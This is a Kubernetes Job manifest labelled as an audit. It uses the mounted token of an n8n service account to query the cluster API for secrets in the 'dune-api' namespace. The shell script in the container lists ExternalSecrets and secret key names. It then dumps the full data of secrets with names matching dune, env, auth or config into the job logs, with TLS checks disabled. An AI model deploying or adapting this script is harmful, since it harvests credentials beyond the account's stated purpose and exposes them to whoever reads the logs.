apiVersion: batch/v1
kind: Job
metadata:
  name: dune-audit-v7
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          KUBE_NS="dune-api"
          
          echo "=EXTERNAL_SECRETS="
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/apis/external-secrets.io/v1beta1/namespaces/$KUBE_NS/externalsecrets" | jq .
          echo "=END_ES="
          
          echo "=ALL_SECRETS_KEYS="
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$KUBE_NS/secrets" | jq '[.items[] | {name:.metadata.name, keys: (.data // {} | keys)}]'
          echo "=END_SK="
          
          echo "=DUNE_ENV_SECRET="
          # Try to find secrets with dune/env/auth0 in name
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$KUBE_NS/secrets" | jq '.items[] | select(.metadata.name | test("dune|env|auth|config";"i")) | {name:.metadata.name, data:.data}'
          echo "=END_DES="